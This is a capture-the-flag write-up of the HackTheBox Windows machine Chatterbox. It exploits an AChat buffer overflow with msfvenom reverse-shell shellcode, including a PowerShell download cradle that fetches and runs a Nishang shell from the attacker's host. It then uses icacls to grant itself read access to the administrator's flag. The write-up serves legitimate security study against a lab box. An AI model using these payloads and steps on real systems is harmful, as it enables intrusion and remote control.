---
title: HTB: Chatterbox
url: https://0xdf.gitlab.io/2018/06/18/htb-chatterbox.html
date: 2018-06-18T11:26:59+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, htb-chatterbox, ctf, msfvenom, meterpreter, achat, autorunscript, nishang, oscp-like-v2, oscp-like-v1
---

Chatterbox is one of the easier rated boxes on HTB. Overall, this box was both easy and frustrating, as there was really only one exploit to get all the way to system, but yet there were many annoyances along the way. While I typically try to avoid Meterpreter, I’ll use it here because it’s an interesting chance to learn / play with the Metasploit AutoRunScript to migrate immediately after exploitation, so that I could maintain a stable shell.

## Box Info

| Name | [Chatterbox](https://hackthebox.com/machines/chatterbox)  [Chatterbox](https://hackthebox.com/machines/chatterbox) [Play on HackTheBox](https://hackthebox.com/machines/chatterbox) |
| --- | --- |
| Release Date | 27 Jan 2018 |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Chatterbox |
| Radar Graph | Radar chart for Chatterbox |
| First Blood User | 00:31:19[0range 0range](https://app.hackthebox.com/users/16316) |
| First Blood Root | 01:13:25[mal mal](https://app.hackthebox.com/users/13417) |
| Creator | [lkys37en lkys37en](https://app.hackthebox.com/users/709) |

## Recon

### nmap

Starting out with an `nmap` scan of the host, we’ll see that no ports in the top 1000 are responding:

```

# Nmap 7.60 scan initiated Tue Mar  6 20:35:14 2018 as: nmap -sV -sC -oA nmap/initial 10.10.10.74
Nmap scan report for 10.10.10.74
Host is up (0.10s latency).
All 1000 scanned ports on 10.10.10.74 are filtered

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  6 20:37:01 2018 -- 1 IP address (1 host up) scanned in 106.77 seconds

```

Expanding that out to all ports, we see that two ports, 9255 and 9256 are open:

```

root@kali# nmap -sT -p- --min-rate 5000 --max-retries 1 10.10.10.74

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-09 22:51 EST
Nmap scan report for 10.10.10.74
Host is up (0.099s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
9255/tcp open  mon
9256/tcp open  unknown

```

Trying a UDP scan as well, all filtered (which is at best inconclusive for UDP):

```

root@kali# nmap -sU -p- --min-rate 5000 --max-retries 1 10.10.10.74

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-09 22:50 EST
Nmap scan report for 10.10.10.74
Host is up (0.099s latency).
All 65535 scanned ports on 10.10.10.74 are open|filtered

```

## AChat

In general, TCP/9255 is Monitor on Network, and TCP/9256 is unassigned. That’s not terribly helpful. However, there are multiple references to `AChat` (for example, [here](https://www.speedguide.net/port.php?port=9256)), and there’s a [SEH-based stack buffer overflow](https://www.exploit-db.com/exploits/36025/) for it.

### AChat Local Testing

I grabbed a copy of the vulnerable version [here](https://sourceforge.net/projects/achat/files/AChat%20beta/AChat%20beta%207%20(v0.150)/achat0-150setup.exe/download), and installed it on a Windows VM. After a simple installation, `AChat` was up and running:
![](https://0xdfimages.gitlab.io/img/chatterbox-achat.png)

#### Recon

Now, to check the ports. First, find the pid, then search the `netstat`:

```

C:\WINDOWS\system32>tasklist | findstr AChat
AChat.exe                     3544 Console                    1     24,580 K

C:\WINDOWS\system32>netstat -ano | findstr 3544
TCP    192.168.249.129:9255   0.0.0.0:0              LISTENING       3544
TCP    192.168.249.129:9256   0.0.0.0:0              LISTENING       3544
UDP    192.168.249.129:9256   *:*                                    3544

```

That’s pretty convincing - Looks like `AChat` is running on Chatterbox. *And* that likely that UDP 9256 is also listening, just not in a way that nmap responds to. To check, I scanned my Windows VM with nmap and got the same results:

```

root@kali# nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.249.129
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-12 19:26 EDT
Nmap scan report for 192.168.249.129
Host is up (0.00044s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
9255/tcp open  mon
9256/tcp open  unknown
MAC Address: 00:0C:29:82:14:87 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 39.49 seconds

root@kali# nmap -sU -p- --min-rate 5000 --max-retries 1 192.168.249.129
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-12 19:26 EDT
Nmap scan report for 192.168.249.129
Host is up (0.00037s latency).
All 65535 scanned ports on 192.168.249.129 are open|filtered
MAC Address: 00:0C:29:82:14:87 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 39.53 seconds

```

#### Exploit

##### Metasploit - Fail

Since Metasploit has this build in, it’s temping to try it. Still targeting the VM:

```

msf exploit(windows/misc/achat_bof) > show options

Module options (exploit/windows/misc/achat_bof):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.249.129  yes       The target address
   RPORT  9256             yes       The target port (UDP)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.249.127  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Achat beta v0.150 / Windows XP SP3 / Windows 7 SP1

```

However, it just fails:

```

msf exploit(windows/misc/achat_bof) > run

[-] Exploit failed: No encoders encoded the buffer successfully.
[*] Exploit completed, but no session was created.

```

I tried with different payloads, and with Wireshark up on the Windows VM, and no traffic ever reached the VM.

##### Exploit-DB Python Script

There’s a [python script](https://www.exploit-db.com/exploits/36025/) on exploit-db for this exploit. In it’s default state, it will launch calc. We’ll update the server address to the IP of the Windows VM, and give it a run:

```

root@kali# python achat-exploit.py
---->{P00F}!

```

On Windows:

![](https://0xdfimages.gitlab.io/img/chatterbox-achat-calc.png)

So we know it works. We’ll also notice that AChat dies when the exploit is run, which is going to make getting onto the actual box a real pain.

### Exploit Chatterbox

#### script + meterpreter - fail

The script comes with shellcode to pop `calc.exe` and an example `msfvenom` command run to generate it. So it makes sense to use `msfvenon` to generate a more useful payload. We’ll start with `meterpreter`:

```

root@kali# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.157 LPORT=4433 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 808 (iteration=0)
x86/unicode_mixed chosen with final size 808
Payload size: 808 bytes
Final size of python file: 3872 bytes
buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
...

```

Then replace the shellcode in the script with our own.

Now, start up `exploit/multi/handler` in `metasploit`, and run the script:

```

root@kali# python achat-shell-8081.py
---->{P00F}!

```

```

[*] Started reverse TCP handler on 10.10.14.157:4433
[*] Sending stage (179779 bytes) to 10.10.10.74
[*] Meterpreter session 1 opened (10.10.14.157:4433 -> 10.10.10.74:49159) at 2018-03-10 13:39:32 -0500

meterpreter > w
[*] 10.10.10.74 - Meterpreter session 1 closed.  Reason: Died

```

Unfortunately, this getting dropped consistently happens each time.

#### script + meterpreter + auto-migrate script

To get around the immediate session death, I employed a `AutoRunScript` to migrate out of the achat process as soon as the connection is established.

First, create an `.rc` file:

```

root@kali# cat automigrate.rc
run post/windows/manage/migrate

```

Then set it to run on connection:

```

msf exploit(multi/handler) > set AutoRunScript multi_console_command -r /root/automigrate.rc

```

Now, on running the script, we can get an interactive session:

```

msf exploit(multi/handler) > set AutoRunScript multi_console_command -r /root/automigrate.rc
[*] Started reverse TCP handler on 10.10.14.157:4433
[*] Sending stage (179779 bytes) to 10.10.10.74
[*] Meterpreter session 11 opened (10.10.14.157:4433 -> 10.10.10.74:49175) at 2018-03-10 14:10:41 -0500
[*] Session ID 11 (10.10.14.157:4433 -> 10.10.10.74:49175) processing AutoRunScript 'multi_console_command -r /root/automigrate.rc'
[*] Running Command List ...
[*]     Running command run post/windows/manage/migrate
[*] Running module against CHATTERBOX
[*] Current server process: AChat.exe (1104)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 584
[+] Successfully migrated to process 584

meterpreter > getuid
Server username: CHATTERBOX\Alfred
meterpreter > pwd
C:\Users\Alfred\Music

```

##### user.txt

From there, we can grab `user.txt`:

```

meterpreter > shell
Process 2244 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Alfred\Music>cd ..\Desktop

c:\Users\Alfred\Desktop>dir

 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of c:\Users\Alfred\Desktop

12/10/2017  06:50 PM    <DIR>          .
12/10/2017  06:50 PM    <DIR>          ..
12/10/2017  06:50 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,159,497,216 bytes free

c:\Users\Alfred\Desktop>type user.txt
type user.txt
72290246...

```

#### alternative method: script + windows shell

To generate shellcode, I’ll use `msfvenon`, editing the example from the comment in the POC. I decided to start with a Windows CMD shell:

```

root@kali# msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.218 LPORT=8081 -e x86/unicode_m
ixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\
xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd
1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\
xfc\xfd\xfe\xff' BufferRegister=EAX -f python > shellcode
Found 1 compatible encodersi
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 808 (iteration=0)
x86/unicode_mixed chosen with final size 808
Payload size: 808 bytes
Final size of python file: 3872 bytes

```

Insert that into the exploit script, and run it:

```

root@kali# python achat-shell-8081.py
---->{P00F}!

```

```

msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.218:8081
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.74
[*] Command shell session 1 opened (10.10.14.218:8081 -> 10.10.10.74:49157) at 2018-06-13 18:33:14 -0400

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```

#### alternative method: script + windows cmd + powershell

When working Windows hosts, I typically use the [Nishang](https://github.com/samratashok/nishang) `Invoke-PowerShellTcp.ps1` script to get a shell. We can do that pretty easily here by changing the command from simply launching calc to one that will invoke powershell and have it call to us to get the shell to execute:

```

root@kali# msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.159/Invoke-PowerShellTcp-8082.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python > shellcode
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 718 (iteration=0)
x86/unicode_mixed chosen with final size 718
Payload size: 718 bytes
Final size of python file: 3442 bytes

```

Put that output into the script, and run it:

```

root@kali# python achat-powershell-80-8082.py
---->{P00F}!

```

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.74 - - [18/Jun/2018 08:36:35] "GET /Invoke-PowerShellTcp-8082.ps1 HTTP/1.1" 200 -

```

```

root@kali# nc -lnvp 8082
listening on [any] 8082 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.10.74] 49159
Windows PowerShell running as user Alfred on CHATTERBOX
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
chatterbox\alfred

```

## Reading root.txt

I didn’t actually get an administrator/system shell on this host, as it wasn’t necessary to read the root flag.

We Alfred, we can access the administrator’s desktop, but can’t read the file:

```

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of c:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          .
12/10/2017  07:50 PM    <DIR>          ..
12/10/2017  07:50 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,162,110,464 bytes free

c:\Users\Administrator\Desktop>type root.txt
Access is denied.

```

If we look at the directory for Desktop itself, Alfred actually has permissions on it:

```

C:\Users\Administrator>icacls Desktop
icacls Desktop
Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CHATTERBOX\Administrator:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files

```

We don’t have read access to the file now:

```

C:\Users\Administrator\Desktop>icacls root.txt
icacls root.txt
root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files

```

But, we can change that with `icacls`:

```

c:\Users\Administrator\Desktop>icacls root.txt /grant alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator\Desktop>icacls root.txt
icacls root.txt
root.txt CHATTERBOX\Alfred:(F)
         CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files

c:\Users\Administrator\Desktop>type root.txt
a673d1b1...

```